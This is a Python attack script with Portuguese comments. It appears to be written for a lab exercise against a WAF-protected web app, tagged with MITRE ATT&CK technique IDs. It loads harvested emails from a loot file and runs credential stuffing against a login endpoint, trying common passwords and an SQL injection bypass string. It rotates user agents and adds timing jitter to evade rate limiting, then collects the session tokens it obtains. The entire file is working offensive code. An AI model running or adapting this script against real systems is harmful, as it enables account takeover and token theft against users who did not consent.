import json
import requests
import random
import time
import os

# --- Configurações de Infraestrutura ---
LOOT_FILE = "loot.json"
TARGET_LOGIN = "http://defense-waf:8080/rest/user/login"

# Evasão de Identidade (T1562)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
]

# Dicionário tático (Senhas comuns + Vetores de Bypass como fallback)
PASSWORD_DICTIONARY = [
    "admin123", "password", "123456", 
    "v", "' OR 1=1--" 
]

def load_intelligence():
    """T1005: Data from Local System - Lê o loot capturado"""
    print(f"[*] Acessando arquivo de inteligência: {LOOT_FILE}")
    if not os.path.exists(LOOT_FILE):
        print("[-] Arquivo de loot não encontrado. Execute a Fase 1 primeiro.")
        return []

    with open(LOOT_FILE, "r") as f:
        try:
            loot_data = json.load(f)
        except json.JSONDecodeError:
            print("[-] Erro de corrupção no loot.json.")
            return []

    emails = set()
    for entry in loot_data:
        for item in entry.get("content", []):
            if "email" in item:
                emails.add(item["email"])
    
    print(f"[+] Inteligência processada: {len(emails)} identidades únicas extraídas.")
    return list(emails)

def execute_credential_stuffing(emails):
    """T1110.004: Credential Stuffing com Evasão"""
    print("[*] Iniciando motor de Movimento Lateral (Credential Stuffing)...")
    
    compromised_accounts = []

    for email in emails:
        print(f"\n--- Alvo: {email} ---")
        for pwd in PASSWORD_DICTIONARY:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Content-Type": "application/json"
            }
            payload = {"email": email, "password": pwd}
            
            try:
                # Jitter para evasão de Rate Limiting (0.5 a 1.5 segundos)
                time.sleep(random.uniform(0.5, 1.5))
                
                res = requests.post(TARGET_LOGIN, json=payload, headers=headers, timeout=5)
                
                if res.status_code == 200:
                    token = res.json().get("authentication", {}).get("token", "TOKEN_NAO_ENCONTRADO")
                    print(f"[!!!] SUCESSO CRÍTICO: Credencial válida -> {email}:{pwd}")
                    compromised_accounts.append({"email": email, "token": token[:20] + "..."})
                    break # Pula para o próximo email após comprometer este
                
                elif res.status_code == 401:
                    print(f"    [-] Falha de autenticação ({pwd})")
                
                elif res.status_code == 403:
                    print(f"    [🛡️] WAF ATIVO: O payload de senha disparou o ModSecurity.")
                
                elif res.status_code == 429:
                    print(f"    [!] Rate Limit atingido. O mecanismo de defesa está atuando.")
                    time.sleep(5) # Backoff passivo
                    
            except Exception as e:
                print(f"[-] Erro de conexão durante o stuffing: {e}")

    return compromised_accounts

def run_lateral_movement():
    target_emails = load_intelligence()
    if not target_emails:
        return

    compromised = execute_credential_stuffing(target_emails)
    
    if compromised:
        print("\n" + "="*50)
        print("Relatório de impacto tático")
        print("="*50)
        print(f"Contas comprometidas: {len(compromised)}")
        for acc in compromised:
            print(f" - {acc['email']} | JWT: {acc['token']}")
        print("="*50)
    else:
        print("\n[-] Nenhuma conta foi comprometida neste ciclo.")

if __name__ == "__main__":
    run_lateral_movement()
